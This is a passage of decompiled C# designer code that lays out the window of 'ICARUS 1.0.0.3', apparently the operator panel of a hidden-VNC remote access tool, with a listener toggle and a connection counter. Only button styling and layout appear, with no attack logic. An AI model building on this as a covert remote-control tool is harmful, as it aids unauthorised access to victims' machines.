            bloom49.Value = Color.FromArgb(20, 40, 70);
            this.studioButton4.Colors = new Bloom[]
            {
        bloom37, bloom38, bloom39, bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46,
        bloom47, bloom48, bloom49
            };
            this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton4.Font = new Font("Verdana", 8f);
            this.studioButton4.Image = null;
            this.studioButton4.Location = new Point(1328, -5);
            this.studioButton4.Name = "studioButton4";
            this.studioButton4.NoRounding = false;
            this.studioButton4.Size = new Size(13, 30);
            this.studioButton4.TabIndex = 23;
            this.studioButton4.Transparent = true;
            this.studioButton4.Click += this.studioButton4_Click;
            this.studioButton3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.studioButton3.BackColor = Color.Transparent;
            bloom50.Name = "DownGradient1";
            bloom50.Value = Color.FromArgb(45, 65, 95);
            bloom51.Name = "DownGradient2";
            bloom51.Value = Color.FromArgb(65, 85, 115);
            bloom52.Name = "NoneGradient1";
            bloom52.Value = Color.FromArgb(65, 85, 115);
            bloom53.Name = "NoneGradient2";
            bloom53.Value = Color.FromArgb(45, 65, 95);
            bloom54.Name = "Shine1";
            bloom54.Value = Color.FromArgb(30, 255, 255, 255);
            bloom55.Name = "Shine2A";
            bloom55.Value = Color.FromArgb(30, 255, 255, 255);
            bloom56.Name = "Shine2B";
            bloom56.Value = Color.Transparent;
            bloom57.Name = "Shine3";
            bloom57.Value = Color.FromArgb(20, 255, 255, 255);
            bloom58.Name = "TextShade";
            bloom58.Value = Color.FromArgb(50, 0, 0, 0);
            bloom59.Name = "Text";
            bloom59.Value = Color.White;
            bloom60.Name = "Glow";
            bloom60.Value = Color.FromArgb(10, 255, 255, 255);
            bloom61.Name = "Border";
            bloom61.Value = Color.FromArgb(20, 40, 70);
            bloom62.Name = "Corners";
            bloom62.Value = Color.FromArgb(20, 40, 70);
            this.studioButton3.Colors = new Bloom[]
            {
        bloom50, bloom51, bloom52, bloom53, bloom54, bloom55, bloom56, bloom57, bloom58, bloom59,
        bloom60, bloom61, bloom62
            };
            this.studioButton3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton3.Font = new Font("Verdana", 8f);
            this.studioButton3.Image = null;
            this.studioButton3.Location = new Point(1309, -5);
            this.studioButton3.Name = "studioButton3";
            this.studioButton3.NoRounding = false;
            this.studioButton3.Size = new Size(13, 30);
            this.studioButton3.TabIndex = 22;
            this.studioButton3.Transparent = true;
            this.studioButton3.Click += this.studioButton3_Click;
            this.panel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            this.panel1.BackColor = Color.White;
            this.panel1.Controls.Add(this.chkListen);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.HVNCListen);
            this.panel1.Location = new Point(14, 32);
            this.panel1.Name = "panel1";
            this.panel1.Size = new Size(1346, 626);
            this.panel1.TabIndex = 39;
            this.chkListen.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.chkListen.BackColor = Color.Transparent;
            this.chkListen.Location = new Point(9, 603);
            this.chkListen.Name = "chkListen";
            this.chkListen.OffFont = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.chkListen.OnFont = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.chkListen.Size = new Size(50, 19);
            this.chkListen.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
            this.chkListen.TabIndex = 40;
            this.chkListen.CheckedChanged += this.chkListen_CheckedChanged;
            this.label1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.label1.AutoSize = true;
            this.label1.Location = new Point(86, 602);
            this.label1.Name = "label1";
            this.label1.Size = new Size(71, 16);
            this.label1.TabIndex = 27;
            this.label1.Text = "Listener :";
            this.HVNCListen.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.HVNCListen.AutoSize = true;
            this.HVNCListen.ForeColor = Color.SteelBlue;
            this.HVNCListen.Location = new Point(156, 602);
            this.HVNCListen.Name = "HVNCListen";
            this.HVNCListen.Size = new Size(62, 16);
            this.HVNCListen.TabIndex = 26;
            this.HVNCListen.Text = "Disabled";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(1374, 671);
            this.ContextMenuStrip = this.contextMenuStrip1;
            base.Controls.Add(this.primeTheme1);
            base.FormBorderStyle = FormBorderStyle.None;
            base.Icon = (Icon)resources.GetObject("$this.Icon");
            base.Name = "Manager";
            base.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "{ ICARUS 1.0.0.3 } - Connections: 0";
            base.TransparencyKey = Color.Fuchsia;
            base.FormClosing += this.Form1_FormClosing;
            base.Load += this.FrmMain_Load;
            this.contextMenuStrip1.ResumeLayout(false);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((ISupportInitialize)this.pictureBox1).EndInit();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            base.ResumeLayout(false);
        }

        static Manager()
        {
            random = new Random();
        }
    }
}